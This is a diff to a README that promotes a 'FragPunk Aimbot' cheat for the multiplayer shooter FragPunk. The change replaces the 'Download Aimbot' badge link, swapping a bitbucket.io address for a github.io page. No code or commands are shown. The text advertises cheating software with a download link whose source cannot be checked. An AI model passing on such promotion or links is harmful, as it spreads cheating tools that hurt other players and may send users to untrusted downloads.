@@ -4,7 +4,7 @@
 
 Perfect for both rage setups and lowkey "legit" configs, it gives you total aim dominance in FragPunk’s fast-paced 5v5 chaos.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload19.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://FragPunk-Aimbot-fad.github.io/.github)
 ---
 
 ## 🎮 What Is a FragPunk Aimbot?
